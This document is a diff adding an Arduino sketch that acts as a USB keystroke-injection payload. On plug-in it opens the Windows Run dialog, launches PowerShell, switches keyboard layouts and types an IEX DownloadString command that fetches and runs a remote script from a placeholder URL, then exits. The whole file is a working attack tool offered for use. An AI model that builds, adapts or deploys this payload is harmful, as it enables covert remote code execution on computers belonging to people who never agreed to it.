@@ -1,0 +1,43 @@
+#include <Keyboard.h> 
+/*
+ * Developer @root_haxor !
+ */
+
+// Init function
+void setup()
+{
+  // Begining the stream
+  Keyboard.begin();
+
+  // Waiting 500ms for init
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("Set/WinUserLanguageList /LanguageList en/US, nb /Force");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.print("IEX ((New-Object System.Net.Webclient).DownloadString(\"YOUR_SCRIPT_HOSTED_ON_SOME_SITE_AS_RAW\")); Set-WinUserLanguageList -LanguageList nb, en-US -Force; exit");
+
+  typeKey(KEY_RETURN);
+}
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+// Unused
+void loop() {}
